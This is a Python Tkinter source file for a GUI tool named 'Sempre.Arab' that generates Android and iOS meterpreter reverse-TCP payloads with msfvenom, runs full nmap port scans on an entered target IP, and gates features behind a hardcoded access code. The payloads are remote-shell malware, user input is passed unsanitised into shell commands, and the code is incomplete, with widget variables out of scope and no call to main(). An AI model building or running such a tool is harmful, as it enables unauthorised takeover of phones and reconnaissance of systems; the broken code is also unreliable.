import subprocess
from tkinter import *
import gettext

def create_android_payload():
    lhost = lhost_entry.get()
    lport = lport_entry.get()
    output_file = output_file_entry.get()
    command = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f raw -o {output_file}"
    subprocess.run(command, shell=True)

def create_ios_payload():
    lhost = lhost_entry.get()
    lport = lport_entry.get()
    output_file = output_file_entry.get()
    command = f"msfvenom -p apple_ios/aarch64/meterpreter_reverse_tcp LHOST={lhost} LPORT={lport} -f raw -o {output_file}"
    subprocess.run(command, shell=True)

def scan_ports():
    target = target_entry.get()
    command = f"nmap -p- {target}"
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    open_ports = []
    for line in result.stdout.splitlines():
        if "/tcp" in line:
            port = line.split("/")[0]
            open_ports.append(port)
    open_ports_label.config(text=(_("Open ports: ") + ', '.join(open_ports)))

def enter_access_code():
    if access_code_entry.get() == "Science":
        access_granted_label.config(text=_("Access Granted"), fg="green")
        lang_label.pack()
        lang_english_button.pack()
        lang_arabic_button.pack()
    else:
        access_granted_label.config(text=_("Access Denied"), fg="red")

def switch_language_to_english():
    lang = gettext.translation('base', localedir='locales', languages=['en'])
    lang.install()
    update_texts()

def switch_language_to_arabic():
    lang = gettext.translation('base', localedir='locales', languages=['ar'])
    lang.install()
    update_texts()

def update_texts():
    payload_label.config(text=_("Payload Creation"))
    lhost_label.config(text=_("LHOST:"))
    lport_label.config(text=_("LPORT:"))
    output_file_label.config(text=_("Output File Name:"))
    android_button.config(text=_("Create Android Payload"), command=create_android_payload)
    ios_button.config(text=_("Create iOS Payload"), command=create_ios_payload)
    port_scan_label.config(text=_("Port Scanning"))
    target_label.config(text=_("Enter target IP:"))
    scan_button.config(text=_("Scan Ports"), command=scan_ports)
    access_code_label.config(text=_("Enter Access Code:"))
    access_button.config(text=_("Enter"), command=enter_access_code)
    access_granted_label.config(text="")
    lang_label.config(text=_("Choose Language:"))
    lang_english_button.config(text=_("English"), command=switch_language_to_english)
    lang_arabic_button.config(text=_("Arabic"), command=switch_language_to_arabic)

def main():
    root = Tk()
    root.title(_("Sempre.Arab"))
    root.geometry("400x300")

    # Payload Creation Section
    payload_label = Label(root, text=_("Payload Creation"), font=("Arial", 12, "bold"), fg="blue")
    payload_label.pack()

    lhost_label = Label(root, text=_("LHOST:"))
    lhost_label.pack()

    lhost_entry = Entry(root)
    lhost_entry.pack()

    lport_label = Label(root, text=_("LPORT:"))
    lport_label.pack()

    lport_entry = Entry(root)
    lport_entry.pack()

    output_file_label = Label(root, text=_("Output File Name:"))
    output_file_label.pack()

    output_file_entry = Entry(root)
    output_file_entry.pack()

    android_button = Button(root, text=_("Create Android Payload"), command=create_android_payload)
    android_button.pack()

    ios_button = Button(root, text=_("Create iOS Payload"), command=create_ios_payload)
    ios_button.pack()

    # Port Scanning Section
    port_scan_label = Label(root, text=_("Port Scanning"), font=("Arial", 12, "bold"), fg="green")
    port_scan_label.pack()

    target_label = Label(root, text=_("Enter target IP:"))
    target_label.pack()

    target_entry = Entry(root)
    target_entry.pack()

    scan_button = Button(root, text=_("Scan Ports"), command=scan_ports)
    scan_button.pack()

    open_ports_label = Label(root, text="")
    open_ports_label.pack()

    # Access Code
    access_code_label = Label(root, text=_("Enter Access Code:"), font=("Arial", 12, "bold"), fg="red")
    access_code_label.pack()

    access_code_entry = Entry(root)
    access_code_entry.pack()

    access_button = Button(root, text=_("Enter"), command=enter_access_code)
    access_button.pack()

    access_granted_label = Label(root, text="")
    access_granted_label.pack()
